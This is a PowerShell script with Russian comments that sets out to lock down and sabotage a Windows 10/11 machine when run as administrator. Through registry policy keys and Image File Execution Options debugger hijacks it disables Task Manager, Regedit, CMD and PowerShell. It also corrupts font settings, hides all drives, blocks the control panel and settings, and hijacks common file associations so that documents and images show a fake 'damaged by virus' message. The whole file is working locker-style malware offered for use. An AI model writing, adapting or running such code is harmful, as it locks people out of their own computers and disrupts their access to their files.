# РАБОЧИЙ БЛОКИРОВЩИК для Windows 10/11
# Запускать от АДМИНИСТРАТОРА!

Write-Host "НАЧИНАЕМ РЕАЛЬНУЮ БЛОКИРОВКУ" -ForegroundColor Red

# ------------------------------------------------------------
# 1. БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ (РАБОЧИЙ МЕТОД)
# ------------------------------------------------------------
Write-Host "[1/6] Блокируем диспетчер задач..." -ForegroundColor Cyan

# Метод 1: Через реестр (требует создания всей ветки)
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "DisableTaskMgr" -Value 1 -PropertyType DWord -Force | Out-Null

# Метод 2: Через групповые политики (более жестко)
$path2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (!(Test-Path $path2)) {
    New-Item -Path $path2 -Force | Out-Null
}
New-ItemProperty -Path $path2 -Name "DisableTaskMgr" -Value 1 -PropertyType DWord -Force | Out-Null

Write-Host "  ✓ Диспетчер задач заблокирован (Ctrl+Alt+Del не поможет)" -ForegroundColor Green

# ------------------------------------------------------------
# 2. БЛОКИРОВКА РЕДАКТОРА РЕЕСТРА
# ------------------------------------------------------------
Write-Host "[2/6] Блокируем Regedit..." -ForegroundColor Cyan

$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
New-ItemProperty -Path $path -Name "DisableRegistryTools" -Value 1 -PropertyType DWord -Force | Out-Null

# Также блокируем через запрет запуска
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "Debugger" -Value "rundll32.exe" -PropertyType String -Force | Out-Null

Write-Host "  ✓ Regedit заблокирован" -ForegroundColor Green

# ------------------------------------------------------------
# 3. БЛОКИРОВКА КОМАНДНОЙ СТРОКИ
# ------------------------------------------------------------
Write-Host "[3/6] Блокируем CMD и PowerShell..." -ForegroundColor Cyan

# Блокировка CMD
$path = "HKCU:\Software\Policies\Microsoft\Windows\System"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "DisableCMD" -Value 1 -PropertyType DWord -Force | Out-Null

# Блокировка PowerShell через Execution Policy (не дает запускать скрипты)
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine -Force

# Также блокируем через Image File Execution Options
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "Debugger" -Value "rundll32.exe" -PropertyType String -Force | Out-Null

Write-Host "  ✓ CMD и PowerShell заблокированы" -ForegroundColor Green

# ------------------------------------------------------------
# 4. ПОРЧА ШРИФТОВ (рабочий метод)
# ------------------------------------------------------------
Write-Host "[4/6] Ломаем шрифты..." -ForegroundColor Cyan

# Отключаем сглаживание (шрифты станут пиксельными)
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "FontSmoothing" -Value "0" -Type String -Force

# Меняем логические шрифты на несуществующие
$fontsPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Fonts"
if (Test-Path $fontsPath) {
    # Создаем резервную копию настроек шрифтов (не трогаем, просто меняем ключи)
    New-ItemProperty -Path $fontsPath -Name "Microsoft Sans Serif" -Value "nonexistent.ttf" -Force -ErrorAction SilentlyContinue
}

# Меняем системный шрифт на что-то ужасное
$path = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Font Management"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "Inactive Fonts" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue

Write-Host "  ✓ Шрифты изменены (требуется перезагрузка)" -ForegroundColor Green

# ------------------------------------------------------------
# 5. ЛОМАЕМ АССОЦИАЦИИ (безопасный вариант)
# ------------------------------------------------------------
Write-Host "[5/6] Ломаем ассоциации файлов..." -ForegroundColor Cyan

# Сохраняем бэкап на рабочий стол
cmd /c "assoc > %userprofile%\Desktop\assoc_backup.txt" 2>$null
cmd /c "ftype >> %userprofile%\Desktop\assoc_backup.txt" 2>$null

# Функция для поломки ассоциации
function Break-Association {
    param($ext, $description)
    
    # Создаем новую фейковую программу в реестре
    $fakeProgId = "fake$ext" + "file"
    $fakePath = "HKCR:\$fakeProgId"
    
    # Создаем запись о фейковой программе
    if (!(Test-Path $fakePath)) {
        New-Item -Path $fakePath -Force | Out-Null
    }
    Set-ItemProperty -Path $fakePath -Name "(Default)" -Value "$description (broken)" -Force
    
    # Создаем команду открытия
    $shellPath = "$fakePath\shell\open\command"
    if (!(Test-Path $shellPath)) {
        New-Item -Path $shellPath -Force | Out-Null
    }
    Set-ItemProperty -Path $shellPath -Name "(Default)" -Value "rundll32.exe user32.dll,MessageBoxA 0, 'Файл поврежден вирусом!', 'Ошибка', 0" -Force
    
    # Привязываем расширение к нашей фейковой программе
    $extPath = "HKCR:\$ext"
    if (!(Test-Path $extPath)) {
        New-Item -Path $extPath -Force | Out-Null
    }
    Set-ItemProperty -Path $extPath -Name "(Default)" -Value $fakeProgId -Force
}

# Ломаем популярные расширения
Break-Association ".txt" "Текстовый документ"
Break-Association ".jpg" "Изображение"
Break-Association ".png" "Изображение"
Break-Association ".mp3" "Музыка"
Break-Association ".docx" "Документ Word"
Break-Association ".xlsx" "Таблица Excel"

# НЕ ЛОМАЕМ .exe .bat .ps1 чтобы можно было восстановить!

Write-Host "  ✓ Ассоциации .txt .jpg .png .mp3 .docx .xlsx сломаны" -ForegroundColor Green

# ------------------------------------------------------------
# 6. ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ
# ------------------------------------------------------------
Write-Host "[6/6] Добавляем дополнительные блокировки..." -ForegroundColor Cyan

# Блокировка Alt+F4, Alt+Tab и других сочетаний
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "NoWinKeys" -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $path -Name "NoClose" -Value 1 -PropertyType DWord -Force | Out-Null

# Скрываем диски в "Моем компьютере"
New-ItemProperty -Path $path -Name "NoDrives" -Value 0x03FFFFFF -PropertyType DWord -Force | Out-Null

# Отключаем контекстное меню рабочего стола
New-ItemProperty -Path $path -Name "NoViewContextMenu" -Value 1 -PropertyType DWord -Force | Out-Null

# Блокируем диспетчер задач через групповые политики (еще один метод)
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "Debugger" -Value "rundll32.exe" -PropertyType String -Force | Out-Null

# Блокируем доступ к параметрам Windows
$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (!(Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name "NoControlPanel" -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $path -Name "NoSettings" -Value 1 -PropertyType DWord -Force | Out-Null

Write-Host "  ✓ Дополнительные блокировки установлены" -ForegroundColor Green

# ------------------------------------------------------------
# ЗАВЕРШЕНИЕ
# ------------------------------------------------------------
Write-Host "`n==================================================" -ForegroundColor Yellow
Write-Host "БЛОКИРОВКА ЗАВЕРШЕНА!" -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "Что заблокировано:" -ForegroundColor Cyan
Write-Host "  • Диспетчер задач (taskmgr.exe)" -ForegroundColor White
Write-Host "  • Редактор реестра (regedit.exe)" -ForegroundColor White
Write-Host "  • Командная строка (cmd.exe)" -ForegroundColor White
Write-Host "  • PowerShell" -ForegroundColor White
Write-Host "  • Ассоциации файлов (.txt, .jpg, и т.д.)" -ForegroundColor White
Write-Host "  • Шрифты (после перезагрузки)" -ForegroundColor White
Write-Host "  • Панель управления и настройки" -ForegroundColor White
Write-Host "  • Контекстное меню" -ForegroundColor White
Write-Host "`nДля применения изменений шрифтов - перезагрузи систему!" -ForegroundColor Magenta
Write-Host "Бэкап ассоциаций сохранен на рабочем столе: assoc_backup.txt" -ForegroundColor Green
